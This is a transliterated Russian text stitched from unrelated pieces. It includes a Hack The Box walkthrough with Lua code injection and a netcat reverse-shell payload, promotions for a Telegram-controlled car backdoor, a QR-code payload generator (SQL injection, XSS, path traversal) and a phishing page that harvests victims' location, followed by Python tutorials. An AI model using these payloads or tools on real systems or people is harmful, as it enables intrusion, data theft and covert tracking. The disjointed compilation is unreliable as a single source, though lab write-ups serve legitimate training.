Hack The Box, a na ee pri mere ia pokazhu, kak eks plu ati rovat' in' ektsii v kod na Lua, obkho dit' direk torii na veb-ser vere, a tak zhe kak vypol niat' pri vile giro van nye koman dy v NetBSD bez ispol' zovaniia sudo. Uro ven' slozh nosti -- Easy, tak chto polez no budet v per vuiu oche red' novich kam. warning Pod kliu chat' sia k mashinam s HTB rekomen duet sia tol' ko cherez VPN. Ne delai eto go s komp' iute rov, gde est' vazh nye dlia tebia dan nye, tak kak ty oka zhesh' sia v obshchei seti s dru gimi uchas tni kami. Razvedka Skanirovanie portov IP-adres mashiny -- 10.10.10.218, sra zu dobav liaem ego v /etc/hosts dlia udobs tva. 10.10.10.218 luanne.htb Na china em so ska niro vaniia por tov. Ia, kak vseg da, ispol' zuiu nebol' shoi skript, kotoryi zapus kaet Nmap v dva eta pa: bys troe obshchee ska niro vanie i zatem na obna ruzhen nykh por takh -- ska niro vanie so skrip tami. ports = $(nmap -p- --min-rate =500 $1 | grep ^[ 0- 9] | cut -d '/ ' -f 1 | tr ' n' ', ' | sed s/,$//)nmap -p $ports -A $1 Re zul' tat raboty skrip taV rezul' tate ska niro vaniia my uzna em o trekh sluzh bakh: port 22 -- SSH; port 80 -- veb-ser ver nginx 1.19.0; port 9001 -- asin khron nyi soket-ser ver Medusa 1.12. Na SSH nam lovit' nechego, tak kak edins tven noe, chto tam mozh no sde lat', -- eto brut forsit' uchet nye dan nye. Vmes to eto go pop robu em pois kat' toch ku vkho da na sai te. Odna ko i na 80-m, i na 9001-m por takh nas ozhi daet HTTP-avto riza tsiia, v dan nom slu chae -- Basic. Pos kol' ku nikakikh uchet nykh dan nykh u nas vna chale net, eto ser' eznaia prob lema. Eshche Nmap pokazal nam nalichie fai la robots.txt na ser vere nginx. Etot fail nuzhen, chto by ogra nichit' obkhod sai ta pois kovymi robota mi (Google, Iandeks i pro chimi). Inog da v nem mozh no pocher pnut' idei dlia raz vitiia ata ki. Perebor katalogov Fail robots.txt sos toit iz nabora ins truk tsii, pri pomoshchi kotorykh mozh no zadat' fai ly, stra nitsy ili katalo gi sai ta, kotorye ne budut indeksi rovat' sia pois kovymi dvizh kami. K pri meru, sde lat' tak, chto by v rezul' tatakh pois kovykh sis tem ne poiav lialis' stra nitsy avto riza tsii admi nis tra torov sai ta, fai ly ili per sonal' naia informa tsiia so stra nits pol' zovate lei. No u liuboi medali dve sto rony: zlo umysh lenni ki i pen teste ry, konech no zhe, sra zu zag liadyva iut v etot fail, chto by uznat', chto pria chut admi ny. Nash slu chai ne iskliu chenie. V robots.txt est' direk toriia weather. Nap riamuiu ee pro chest' nel' zia, no esli sde lat' perebor po slo variu, to my mozhem nat knut' sia na chto-to inte res noe. Dlia ska niro vaniia ia ispol' zoval uti litu ffuf. V kaches tve paramet rov ei nuzh no peredat' spi sok dlia perebo ra (optsiia -w) i URL (optsiia -u). Mes to v URL, kuda budut pod stav liat' sia slo va iz spis ka, otme chaet sia slo vom FUZZ. ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://luanne.htb/weather/FUZZ/ Re zul' tat ska niro vaniia soder zhimogo katalo ga weatherMy bys tro nakhodim eshche odin katalog, kotoryi ver nul kod 200, a eto zna chit, chto on nam dos tupen. Tochka vkhoda Na khodim katalog forecast i pro buem zai ti tuda cherez bra uzer. Stra nitsa pus ta, no esli pos motret' iskhodnik otve ta, to uvi dim pod skaz ku. So obshche nie o tre bova nii pereda chi paramet ra cityTre buet sia uka zat' parametr city, odno iz zna chenii kotoro go mozhet byt' list. Dela em soot vets tvu iushchii zap ros i polucha em spi sok gorodov v for mate JSON. Obych no pri tes tirova nii veb-pri lozhe nii sto it opre delit' tri reak tsii pri lozhe niia na pol' zovatel' skii zap ros: uspeshno obra botan nyi zap ros, neudach no obra botan nyi zap ros i oshib ka pri obra bot ke zap rosa. Davai vypol nim tri zap rosa: zap ros valid nogo goroda (gorod iz spis ka); zap ros nevalid nogo goroda (gorod, kotoro go net v spis ke); zap ros, kotoryi vyzyva et oshib ku (ispol' zuet raz nye slu zheb nye sim voly, v dan nom slu chae -- kavych ku). Zap ros goroda iz spis ka Zap ros goroda, kotoro go net v spis ke Vy zov oshib ki otprav koi sim vola kavych kiV pos lednem slu chae vidim oshib ku ot inter pre tato ra iazy ka Lua: attempt to call a nil value. Eto zna chit, chto nash vvod byl pod stav len v skript bez pred varitel' noi chis tki, a eto otkry vaet voz mozhnost' dlia in' ektsii koda. Zakreplenie Lua -- skrip tovyi iazyk, a zna chit, nefil' tro van nye vstav ki v kod ochen' opas ny. Mozh no vmes to zna cheniia peredat' zak ryva iushchuiu kavych ku i liuboi kod na Lua -- on budet vypol nen inter pre tato rom kak rod noi. Da vai pop robu em podob nym obra zom zak ryt' stro ku i dobavit' fun ktsiiu execute iz modulia os -- ona vypol niaet liubuiu koman du ope ratsi onnoi sis temy. Dal' she dobavim ob' iavle nie peremen noi i otkry vaiushchuiu kavych ku, chto by zak ryva iushchaia kavych ka, idu shchaia v kode dal' she, ne osta las' bez pary i ne pri vela k oshib ke ispolne niia. Vot tak, k pri meru, mozh no pro chitat' fail /etc/passwd: ') os. execute( "cat / etc/ passwd") x=( ' Pol nyi zap ros, sde lan nyi koman doi surl, budet vyg liadet' sle duiushchim obra zom: curl "http://luanne.htb/weather/forecast/?city=London') os.execute("cat /etc/passwd") x%3D('" Re zul' tat vstav ki kodaTak kak koman dy uspeshno vypol niaiut sia, my mozhem pros to vypol nit' gotovyi bek shell i poluchit' voz mozhnost' upravliat' mashinoi. os. execute ( "rm / tmp/ r; mkfifo / tmp/ r; cat / tmp/ r|/ bin/ sh -i 2> & 1|nc [ ip] [ port] >/ tmp/ r" ) Etot kod dol zhen vyz vat' kon nekt na uka zan nyi adres, nuzh no lish' vpi sat' IP i port. No prezh de chem zapus kat' etu koman du, soz dadim lis tener, kotoryi budet pri nimat' eto soedi nenie. Ia sovetuiu ispol' zovat' rlwrap, eto udob naia obo loch ka, kotoraia v chis le pro chego vedet isto riiu komand. V kaches tve lis tenera ispol' zuem izves tnyi netcat. apt install rlwrap rlwrap nc -lvp [port] Za kodi ruem nashu nag ruzku v URL Encode i vypol nim zap ros. Poch ti momen tal' no v kon soli netcat polucha em soob shchenie ob obratnom pod kliu chenii. curl "http://luanne.htb/weather/forecast/?city=London') os%2Eexecute%28%22rm %2Ftmp%2Fr%3Bmkfifo %2Ftmp%2Fr%3Bcat %2Ftmp%2Fr%7C%2Fbin%2Fsh %2Di 2%3E%261%7Cnc 10%2E10%2E14%2E108 4321 %3E%2Ftmp%2Fr%22%29 x%3D('" Po luche nie bek shellaKo man da id pomoga et nam uznat', chto my rabota em v kon tek ste uchet noi zapisi sluzh by _httpd. Prodvizhenie Sna chala nem nogo pro apgrei dim svoi shell, tak kak nam mozhet pri godit' sia obo loch ka TTY. Ee mozh no poluchit' s pomoshch'iu ime iushche gosia v tselevoi sis teme inter pre tato ra Python 3. python3 -c 'import pty; pty.spawn("/bin/sh")' /bin/bash Dos tup k khos tu est', no dlia dal' neishe go prod vizheniia nam nuzh ny uchet nye dan nye pol' zovate lei. Ne beda -- nuzh no lish' znat' mes ta, gde ikh iskat'. Odno iz takikh mest -- ser vernaia chast' sai ta. Poch ti u vsekh sai tov est' istochnik uchet nykh dan nykh, v bol' shins tve slu chaev eto BD. To est' ata kuiushchii polucha et dos tup k baze dan nykh i izvle kaet iz nee ime na pol' zovate lei i kheshi ikh parolei. V nashem slu chae ispol' zuet sia auten tifika tsiia HTTP Basic, a eto zna chit, chto kakie-to uchet nye dan nye poluchit' vse zhe mozh no. Sna chala pro verim nalichie fai la .htpasswd v rabochei direk torii veb-ser vera, etot fail soder zhit imia i khesh parolia pol' zovate lia. Fail .htpasswdSokh ranim khesh v fail i perebe rem ego, k pri meru, s pomoshch'iu John The Ripper. V paramet rakh ia uka zyvaiu slo var' s parolia mi i fail s kheshem. <<Dzhon>> sam opre delit algo ritm, vypol nit perebor i v slu chae uspe kha ver net nam parol'. john --wordlist=./tools/rockyou.txt web.hash Re zul' tat perebo ra paroliaS etim parolem ne polucha etsia avto rizo vat' sia kak pol' zovatel' sis temy, poeto mu pro dol zhaem iskat'. Ia pod metil, chto domash niaia pol' zovatel' skaia direk toriia /home/r.michaels dos tupna dlia chte niia grup pe users, a dlia lokal' nogo khos ta pros lushiva iutsia TCP-por ty 3000 i 3001 (eto mozh no uznat' koman doi netstat -ant). So der zhimoe katalo ga /home/ Pros lushiva emye TCP-por tyChto by opre delit', za chto otve chaiut eti por ty, pod kliu chim sia k kazh domu s pomoshch'iu netcat i pos motrim, chto nam ver nut. nc 127.0.0.1 3000 nc 127.0.0.1 3001 Pod kliu chenie k por tam 3000 i 3001Kak vidish', eti por ty otno siat sia k veb-ser veru bozotic. Pro verim, chto on nam dast pos motret' v kor nevom katalo ge. Otvet na obo ikh por takh odi nako vyi -- tre buet sia HTTP-avto riza tsiia (kod 401). curl 127.0.0.1:3000 curl 127.0.0.1:3001 Ot vet ser vera pri obra shchenii k kor nevomu katalo gu

CANalyse is a tool built to analyze the log files to find out unique datasets automatically and able to connect to simple user interfaces such as Telegram. Basically, while using this tool the attacker can provide a bot-ID and use the tool over the internet through telegram-bot. CANalyse is made to be placed inside a raspberry-PI and able to exploit the vehicle through a telegram bot by recording and analysing the network traffic/data logs, like a hardware backdoor planted in a car.  A prerequisite to using this tool is that the Hardware implant is already installed in the car and capable of communicating with the Network/communication channels inside the vehicle.Explained here    Requirements:    Installation of CANalyse:git clone https://github.com/KartheekLade/CANalyse.gitcd CANalysepip3 install -r requirements.txt  Usagecd CANalyse/python3 canalyse_tool.py  Troubleshooting    If the tool dumps "No such device" error or you can't view any traffic, check if the interface & communication channel in settings... #backdoor #canalys #carhacking #hardware #networkanalysis #requirements #scripting #telegram

Nekotoroe vremia tomu nazad ia nachal pisat' pamiatku dlia studentov, obuchaiushchikhsia na moem kurse po bazovomu Python.  Osnovnaia tsel' pamiatki - sobrat' vmeste vse opredeleniia, algoritmy, funktsii i metody, kotorye upominaiutsia v khode obucheniia.  So vremenem pamiatka stala razrastat'sia, poiavilas' poshagovaia instruktsiia o nastroike rabochego okruzheniia: chto nado ustanovit', dlia chego i kak nastroit'.  Nuzhno eshche mnogoe napisat', no vozmozhno uzhe seichas komu-to dannaia pamiatka mozhet prigodit'sia. Poetomu ia reshil vylozhit' ee v publichnom dostupe.

Nginxpwner is a simple tool to look for common Nginx misconfigurations and vulnerabilities.Install:cd /optgit clone https://github.com/stark0de/nginxpwnercd nginxpwnerchmod +x install.sh./install.sh  Usage:Target tab in Burp, select host, right click, copy all URLs in this host, copy to a filecat urllist | unfurl paths | cut -d"/" -f2-3 | sort -u > /tmp/pathlist Or get the list of paths you already discovered in the application in some other way. Note: the paths should not start with /Finally:python3 nginxpwner.py https://example.com /tmp/pathlist  Notes:It actually checks for:  -Gets Ngnix version and gets its possible exploits using searchsploit and tells if it is outdated  -Throws a wordlist specific to Nginx via gobuster  -Checks if it is vulnerable to CRLF via a common misconfiguration of using $uri in redirects  -Checks for CRLF in all of the paths provided  -Checks if the PURGE HTTP method is available from the outside  -Checks for variable leakage misconfiguration  -Checks for path traversal vulnerabilities via merge_slashes set to off  -Tests for differences in the length of requests when using hop-by-hop headers (ex: X-Forwarded-Host)  -Uses Kyubi to test for..

Darkdump v Termux  Darkdump - eto prostoi skript, napisannyi na Python3.9, kotoryi pozvoliaet pol'zovateliam vvodit' poiskovyi zapros (zapros) v komandnoi stroke, a darkdump budet izvlekaet vse glubokie veb-saity, otnosiashchiesia k etomu zaprosu. Darkdump zavershaet API darksearch.io.  Ustanovka Obnovliaem pakety: $ apt update $ apt upgrade  Ustanavlivaem git: $ pkg install git -y  Ustanavlivaem python: $ pkg install python  Ustanavlivaem repozitorii: $ git clone https://github.com/josh0xA/darkdump.git  Perekhodim v repozitorii: $ cd darkdump  Ustanovka utility $ pip install -r requirements.txt  Ispol'zovanie $ python darkdump.py --help  ----------------------------------------- Nashi proekty: YouTube: vk.cc/bWMyTS VK: vk.cc/bWMyVZ Telegram: vk.cc/bWMyWY ----------------------------------------- Chaty nashego proekta: VK: vk.cc/bWMyYz Telegram: vk.cc/bWMz0h ----------------------------------------- Igrovaia zona i ne tol'ko: Discord: vk.cc/bX5nij -----------------------------------------

Segodnia mne prishlos' razgadyvat' zagadku vypolneniia koda na Python, i vospol'zovalsia fokusom s otladkoi v rezhime machete, chtoby poniat', v chem delo. Esli ran'she vy nikogda ne slyshali etot termin, to poiasniu, rezhim <<machete>> -- eto kogda vy ispol'zuete grubyi vremennyi kod dlia polucheniia informatsii liubym sposobom.

QRGen -- kazhdomu po kodu Nachnem s utility QRGen, kotoraia pozvoliaet sozdavat' QR-kody s zakodirovannymi v nikh skriptami. Kopiruem repozitorii i perekhodim v papku s soderzhimym. git clone https://github.com/h0nus/QRGen cd QRGen && ls pip3 install -r requirements.txt python3 qrgen.py (eto bol'shaia chast' kodov na dannuiu programmu) Argument -h vyvedet to zhe samoe, a vot zapusk s kliuchom -l privedet k generatsii QR-kodov iz opredelennoi kategorii. Vsego ikh vosem'. SQL-in'ektsii. XSS. In'ektsii komand. QR s formatirovannoi strokoi. XXE. Fazzing strok. SSI-in'ektsii. LFI ili poluchenie dostupa k skrytym katalogam. Vybiraem punkt Vidim chto sgenerirovano 158 peiloudov. Vykhodim s utility i pishem cd genqr ls Dlia ikh sokhraneniia pishem termux-setup-storage cp nazvanie.png /sdcard I v provodnike v nedavnikh failakh mozhem uvidet' kod. Vozmozhnye ataki Gif s stranitsy github Teper' davai posmotrim na primery iz kazhdoi kategorii, a takzhe razberemsia, kakoi uron i kakim ustroistvam oni mogut nanesti. Vozmozhnye ataki Teper' davai posmotrim na primery iz kazhdoi kategorii, a takzhe razberemsia, kakoi uron i kakim ustroistvam oni mogut nanesti. 1. 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z 2.
8. ../../../../../../etc/passwd Posmotret' tekstovye faily so vsemi variantami <> QR-kodov ty mozhesh' v papke words (oni razdeleny po kategoriiam, ukazannym vyshe). Teper' para slov o posledstviiakh atak podobnymi nagruzkami Pervyi klass atak -- SQL-in'ektsii -- ispol'zuiut pri vzlome BD i narushenii raboty veb-saitov. Naprimer, zapros mozhet vyzyvat' zavisanie saita. Sleduiushchii primer (pod nomerom 2) demonstriruet ekspluatatsiiu XSS-uiazvimosti pri atake na veb-prilozheniia s ispol'zovaniem SVG (Scalable Vector Graphic). K chemu mozhet privesti XSS, ty, dumaiu, i bez menia prekrasno znaesh', tak chto podrobno na etom ostanavlivat'sia ne budu. Tretii punkt vyvodit na ekran zhertvy soderzhimoe faila /etc/passwd: spisok akkauntov Linux-based-sistem i dopolnitel'nuiu informatsiiu o nikh (ran'she -- kheshi parolei etikh uchetnykh zapisei). V podobnykh sluchaiakh obychno staraiutsia poluchit' /etc/shadow i konfiguratsiiu servera, no vse ochen' sil'no zavisit ot tseli, tak chto kakie faily chitat' -- reshai sam. Chetvertyi primer predstavliaet soboi vyrazhenie, kotoroe vyzovet perepolnenie bufera (buffer overflow). Ono voznikaet, kogda ob'em dannykh dlia zapisi ili chteniia bol'she, chem vmeshchaet bufer, i sposobno vyzvat' avariinoe zavershenie ili zavisanie programmy, vedushchee k otkazu v obsluzhivanii (denial of service, DoS). Otdel'nye vidy perepolnenii daiut zloumyshlenniku vozmozhnost' zagruzit' i vypolnit' proizvol'nyi mashinnyi kod ot imeni programmy i s pravami uchetnoi zapisi, ot kotoroi ona vypolniaetsia, chto delaet etu oshibku dovol'no opasnoi. Piatyi po schetu klass atak (XXE Injections) predstavliaet soboi variant polucheniia skrytoi informatsii veb-servera s pomoshch'iu analiza vyvoda XML-failov. Konkretno v nashem primere pri zaprose k serveru tot otvetit zashifrovannym v Base64 soderzhimym faila /etc/passwd, kotoryi uzhe upominalsia. Odnako rasshifrovat' ego ne sostavit truda -- dostatochno lish' vospol'zovat'sia vstroennoi v bol'shinstvo distributivov Linux utilitoi base64 libo zhe onlain-konverterom. Ataki formatnoi stroki (primer 6) -- eto klass uiazvimostei, kotoryi vkliuchaet v sebia predostavlenie <> dlia vypolneniia proizvol'nogo koda ili sboia programmy. Govoria chelovecheskim iazykom, eto klass atak, pri kotorykh prilozhenie nekorrektno ochishchaet pol'zovatel'skii vvod ot upravliaiushchikh konstruktsii, iz-za chego eti konstruktsii v rezul'tate ispolniaiutsia. Esli ty programmiroval na S, to, konechno, pomnish' te interesnosti s vyvodom peremennykh cherez printf: nado bylo v pervom argumente (kotoryi stroka) ukazat' na tip vyvodimogo znacheniia (%d dlia desiatichnogo chisla i tak dalee). Sed'moi punkt predstavliaet soboi variant command injection, kotoraia vypolniaet opredelennyi kod na storone servera. V moem primere budet vypolnena komanda ls, kotoraia pokazhet soderzhimoe tekushchei direktorii, no, konechno, tam mozhet byt' gorazdo bolee opasnyi kod. I nakonets, posledniaia kategoriia -- eto LFI-uiazvimosti (Local File Inclusion; vkliuchenie lokal'nykh failov), pozvoliaiushchie prosmotret' na uiazvimykh (ili nepravil'no nastroennykh) serverakh faily i papki, kotorye ne dolzhny byli byt' vidny vsem. Odin iz vozmozhnykh variantov -- prosmotret' fail /etc/passwd, o kotorom my s toboi uzhe ne raz govorili. Eto mozhet vygliadet' vot tak. Obrati vnimanie, chto v kachestve testovogo veb-prilozheniia ispol'zuetsia DVWA (Damn Vulnerable Web Application), kotoryi byl spetsial'no razrabotan dlia obucheniia pentestu. Mnogie ataki na veb-prilozheniia mozhno otrabotat' na nem.

24 iiunia razrabotchiki Telegram otkryli platformu dlia sozdaniia botov. Novost' kogo-to oboshla storonoi Khabr, odnako mnogie uzhe nachali razrabatyvat' viktoriny. Pri etom malo gde ukazany khot' kakie-to primery rabotaiushchikh botov.

Kak tol'ko na territorii RF vstupil v silu zapret na anonimnost' v messendzherakh, u menia doshli ruki napisat' post pro telegram-bota. Po khodu sozdaniia bota stolknulsia s bol'shim kolichestvom problem, kotorye prishlos' reshat' po otdel'nosti, i bukval'no vytsezhivat' krupinki informatsii so vsego interneta. I vot posle neskol'kikh mesiatsev stradanii i muchenii (koding - ne osnovnoe moio zaniatie) ia nakonets-to zakonchil s botom, razobralsia so vsemi problemami i gotov povedat' svoiu istoriiu Vam.
Privet, Khabr! Ia Slava, rukovoditel' komandy <<Professional'nye instrumenty>> v Tsiane, chlen PK Moscow Python Conf i chlen core-komandy avtorov v Iandeks.Praktikume.

MapEye -- utilita s pomoshch'iu kotoroi    mozhno opredelit' tochnoe mestopolozhenie pol'zovatelia metodom fishinga! Ustanovka: Obnovimsia apt update apt upgrade Dalee ustanavlivaem neobkhodimye nam pakety: GIT i PHP, Python. apt install git -y apt install php -y apt install python -y Ustanovim sam repozitorii git clone https://github.com/bhikandeshmukh/MapEye.git cd MapEye Dop. ustanovka pip install requests Ispol'zovanie python3 mapeye.py -h Dalee ispol'zuem Ngrok, manual o ego rabote s nim est' na kanale Kontseptsiia mapeye.py prosta, tochno tak zhe, kak my razmeshchaem fishingovye stranitsy dlia polucheniia uchetnykh dannykh, pochemu by ne razmestit' poddel'nuiu stranitsu, kotoraia zaprashivaet vashe mestopolozhenie, kak mnogie populiarnye veb-saity, osnovannye na mestopolozhenii. Mapeye.py Razmeshchaet fal'shivyi veb-sait, kotoryi zaprashivaet razreshenie na mestopolozhenie, i esli tsel' pozvoliaet eto, my mozhem poluchit': *Dolgota *Shirota *Tochnost' *Vysota - ne vsegda dostupno *Napravlenie - dostupno tol'ko v tom sluchae, esli pol'zovatel' dvizhetsia *Skorost' - dostupno, tol'ko esli pol'zovatel' dvizhetsia  Nariadu s informatsiei o mestopolozhenii my takzhe poluchaem informatsiiu ob ustroistve bez kakikh-libo razreshenii: *Unikal'nyi identifikator s ispol'zovaniem Canvas Fingerprinting *Model' ustroistva - ne vsegda dostupno *Operatsionnaia sistema *Platforma *Kolichestvo iader protsessora - priblizitel'nye rezul'taty *Kolichestvo operativnoi pamiati - priblizitel'nye rezul'taty *Razreshenie ekrana *Informatsiia o GPU *Imia i versiia brauzera *Publichnyi IP-adres *Avtomaticheskaia razvedka IP-adresov vypolniaetsia posle polucheniia vysheukazannoi informatsii.

Ustanovka  $ git clone https://github.com/HackWeiser360/IP-icker $ cd IP-icker  Ispol'zovanie  $ python3 IP-icker.py  Podrobnee pro utilitu mozhete prochitat' na ofitsial'noi stranitse Github repozitoriia

1. Osnovnye vozmozhnosti biblioteki Requests Modul' razrabotan s uchetom potrebnostei sovremennykh web-razrabotchikov i aktual'nykh tekhnologii. Mnogie operatsii avtomatizirovany, a ruchnye nastroiki svedeny k minimumu.  Dlia ponimaniia instrumentariia biblioteki perechislim ee osnovnye vozmozhnosti: - podderzhka postoiannogo HTTP-soedineniia i ego povtornoe ispol'zovanie; - primenenie mezhdunarodnykh i natsional'nykh domenov; - ispol'zovanie Cookie: peredacha i poluchenie znachenii v formate kliuch: znachenie; - avtomaticheskoe dekodirovanie kontenta; - SSL verifikatsiia; - autentifikatsiia pol'zovatelei na bol'shinstve resursov s sokhraneniem; - podderzhka proxy pri neobkhodimosti; - zagruzka i vygruzka failov; - strimingovye zagruzki i fragmentirovannye zaprosy; - zaderzhki soedinenii; - peredacha trebuemykh zagolovkov na web-resursy i dr.  V tselom, prakticheski liubaia zadacha, kotoraia voznikaet u razrabotchika, nashla svoe otrazhenie v kode biblioteki. Vazhno ponimat', chto Requests ne prednaznachen dlia parsinga otveta servera (dlia etogo primeniaiut drugie moduli, naprimer, Beautiful Soup). 2. Pervichnaia nastroika i nachalo raboty Pervym delom ustanovim biblioteku v trebuemuiu papku (cherez konsol'). Konsol'/Terminal pip install requests # Dlia Windows pip3 install requests # Dlia Linux, MacOS Eta komanda ustanovit Requests i dopolnitel'nye zavisimye moduli. Polezno znat' Soglasno rekomendatsiiam ofitsial'noi dokumentatsii Python mozhno primeniat' i drugoi sposob ustanovki bibliotek, kotoryi pozvoliaet kontrolirovat' versiiu iazyka, zapuskat' biblioteku napriamuiu iz konsoli. Konsol'/Terminal - Primery al'ternativnoi ustanovki python -m pip install requests # Ustanovit biblioteku dlia poslednei versii Python python3.7 -m pip install requests # Requests dlia Python 3.7 Chtoby proverit', chto vse proshlo uspeshno, sdelaem prostoi GET zapros na sait https://github.com. Primer - Interaktivnyi rezhim >>> import requests >>> response = requests.get('https://github.com') >>> response <Response [200]> Nikakikh oshibok ne polucheno, sledovatel'no, zapros proshel uspeshno. Otvet ot servera sokhraniaem v ob'ekt response. V nem soderzhitsia vsia neobkhodimaia informatsiia dlia analiza, kotoruiu nam predostavil servis. Rassmotrim osnovnye atributy dannogo ob'ekta (v primerakh nizhe chast' otvetov servera budet vyrezana, chtoby ne zagromozhdat' prostranstvo). Primer - Interaktivnyi rezhim >>> dir(response) [..., 'apparent_encoding', 'close', 'connection', 'content', 'cookies', 'elapsed', 'encoding', 'headers', 'history', 'is_permanent_redirect', 'is_redirect', 'iter_content', 'iter_lines', 'json', 'links', 'next', 'ok', 'raise_for_status', 'raw', 'reason', 'request', 'status_code', 'text', 'url'] K liubomu iz etikh atributov mozhno obratit'sia, chtoby poluchit' bolee detal'nuiu informatsiiu. 1. Atribut 'headers' Primer - Interaktivnyi rezhim >>> response.headers {'Server': 'GitHub.com', 'Date': 'Fri, 05 Mar 2021 09:47:19 GMT', 'Content-Type': 'text/html; charset=utf-8', ...} Svoistvo pozvoliaet prosmotret' zagolovki otveta servera: ego tip, datu obrashcheniia, format soderzhimogo, kodirovku i dr. 2. Atributy: 'status_code', 'ok' Primer - Interaktivnyi rezhim >>> response.status_code 200 >>> response.ok True Kod statusa 200 govorit o tom, chto zaprashivaemyi sait obnaruzhen, i my ot nego poluchili uspeshnyi otvet. Vazhno znat' Kody HTTP-otvetov pokazyvaiut uspeshnost' vypolneniia zaprosov k serveru. Ikh gruppiruiut po 5 klassam: - informatsionnogo kharaktera (100-199) - raznogo roda podskazki, prizyvy k prodolzheniiu promezhutochnykh deistvii - uspeshnye (200-299) - zapros obrabotan, otvet poluchen, soderzhimogo net, no prislany zagolovki i t.p. - kody perenapravleniia (300-399) - pol'zovatel' perenapravliaetsia po drugoi ssylke - oshibki na storone klienta (400-499) - pol'zovatel' ne avtorizovan, net takoi stranitsy, zapreshchen dostup i dr. - oshibki na servere (500-599) - servis ne dostupen po kakim-libo prichinam, metod zaprosa im ne podderzhivaetsia. Blagodaria vozmozhnosti proveriat' status otveta, my mozhem po-raznomu reagirovat' iskhodia iz etogo. Svoistvo ok bolee obshchee. Udobno, kogda nuzhno ubedit'sia, chto vse khorosho (pod etim ponimaiutsia otvety s kodami ot 200 do 399). 3. Atributy: 'url', 'request' Primer - Interaktivnyi rezhim >>> response.request <PreparedRequest [GET]> >>> response.url 'https://github.com/' Privedennye svoistva predostavliaiut informatsiiu o metode zaprosa (GET, POST i dr.) i zaprashivaemoi ssylke so vsemi dopolnitel'nymi parametrami. 4. Atributy: 'text', 'content', 'json' Primer - Interaktivnyi rezhim >>> response.text '




<!DOCTYPE html>
<html lang="en" class="html-fluid">
 <head>
 <meta charset="utf-8">
 <link rel="dns-prefetch" href="https://github.githubassets.com">
 <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">... >>> response.content b'




<!DOCTYPE html>
<html lang="en" class="html-fluid">
 <head>
 <meta charset="utf-8">
 <link rel="dns-prefetch" href="https://github.githubassets.com">
 <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">... >>> response.json() Error... Svoistvo text pokazyvaet telo otveta servera v tekstovom formate (aktual'no dlia html-stranits), content - rezul'tat v vide baitov (udobno pri skachivanii graficheskoi, audio- ili videoinformatsii), metod json() privodit soderzhimoe otveta k obychnomu slovariu (esli dannye k nemu privodimy, v protivnom sluchae budet oshibka, kak v primere; aktual'no dlia API-zaprosov).

Praktika Podrobnaia video-instruktsiia po rabote c dvumia rezhimami interpretatora Python zhdet vas v Uroke 2. Tipy dannykh v Python. A poka predlagaem vam samostoiatel'no vypolnit' sleduiushchie deistviia:  1. Ustanovit' Python na svoi rabochii komp'iuter(sm. instruktsiiu po ustanovke v sootvetstvuiushchem punkte prakticheskoi chasti uroka) 2. Oznakomit'sia s interaktivnym rezhimom raboty Python. Dlia etogo: V terminale/konsoli voidite v interaktivnyi rezhim Vypolnite komandu 'print('Hello, World!')' Poprobuite vypolnit' drugie komandy 3. Zapustit' programmu na Python iz faila. Dlia etogo: Sozdaite fail my_program.py Dobav'te v kachestve ego soderzhimogo programmu, sostoiashchuiu iz odnoi komandy: print('Hello, World!') Sokhranite izmeneniia v faile V terminale obratites' k interpretatoru Python i ukazhite emu, kakoi fail s programmoi neobkhodimo zapustit': python3 my_program.py Poprobuite izmenit' soderzhimoe programmy. Proverka domashnego zadaniia Pozhaluista obratite vnimanie, chto v Uroke 1 my ne proveriaem Vashe domashnee zadanie. My by dazhe skazali, chto zadaniia kak takovogo i net. Na tekushchem etape nasha tsel' - pozvolit' Vam nastroit' okruzhenie i ubedit'sia v ego rabotosposobnosti. Dlia etogo Vam nuzhno ustanovit' interpretator Python i vypolnit' minimal'nyi nabor samykh prostykh komand, kotorye my priveli vyshe.  Uzhe v Uroke 2 zadanie stanet polnotsennym - neobkhodimo budet napisat' 2 nebol'shikh programmy v kachestve zakrepleniia navykov raboty s razlichnymi tipami dannykh v Python.

Sposob 2. Zapuskaem fail s tekstom programmy. Prezhde chem pristupit' k napisaniiu programm na Python v failakh, nam nuzhen redaktor dlia raboty s failami programm. Odno iz samykh osnovnykh trebovanii - eto podsvetka sintaksisa, kogda raznye elementy programmy na Python raskrasheny tak, chtoby vy mogli legko videt' vashu programmu i khod eio vypolneniia.  Rekomendatsii po vyboru redaktora poluchili, idem dal'she. Dlia togo, chtoby zapustit' na ispolnenie fail s programmnym kodom na Python, neobkhodimo vypolnit' sleduiushchie deistviia: Listing programmy na Python Sozdaite fail s rasshireniem *.py. V kachestve soderzhimogo sozdannogo faila napishite kod vashei programmy. Iz konsoli vyzovite interpretator python3 i v kachestve parametra ukazhite emu put' k failu s programmoi: python3 <program_file> Nazhmite Enter i naslazhdaites' rezul'tatom vypolneniia! Povtorim primer s sozdaniem spiska i vyvodom ego soderzhimogo, no uzhe v rezhime zapuska programmy iz faila. Sozdadim fail my_program.py. Kod programmy vnutri nego budet sostoiat' iz 2 strok(kak i v pervom sluchae sozdadim spisok i vyvedem ego soderzhimoe): Kod programmy(soderzhimoe faila my_program.py) lst = list('Zapusk programmy') print(lst) Dalee zapustim interpretator i dadim emu put' k nashemu failu: Terminal python3 my_program.py Rezul'tat vypolneniia: Terminal $ python3 my_program.py ['Z', 'a', 'p', 'u', 's', 'k', ' ', 'p', 'r', 'o', 'g', 'r', 'a', 'm', 'm', 'y']

Sposob 1. Interaktivnyi rezhim. Kak popast' v interaktivnyi rezhim? Neobkhodimo vypolnit' sleduiushchie deistviia:  Otkryt' konsol'(komandnaia stroka v sluchae Windows ili terminal dlia OS semeistva Linux). Vvesti python3, tem samym vyzvav interpretator, i nazhat' Enter Dalee vy dolzhny uvidet' simvoly >>>. Eto znachit, chto vy uspeshno pereshli v komandnuiu stroku interpretatora Python. Naprimer, v terminale MacOS uspeshnyi vkhod v interaktivnyi rezhim vygliadit sleduiushchim obrazom: Interpretator Python i terminal konsol' Terminal $ python3 Python 3.7.5 (default, Nov 5 2019, 23:12:00)  [Clang 9.0.0 (clang-900.0.39.2)] on darwin Type "help", "copyright", "credits" or "license" for more information. >>> Teper' vy mozhete vvodit' komandy priamo v komandnuiu stroku interpretatora. Obratite vnimanie, chto Python vydaiot rezul'tat raboty stroki nemedlenno! Dlia primera sozdadim spisok i vyvedem ego soderzhimoe v konsol' s pomoshch'iu metoda print(): Terminal >>> lst = list('Interaktivnyi rezhim') >>> print(lst) 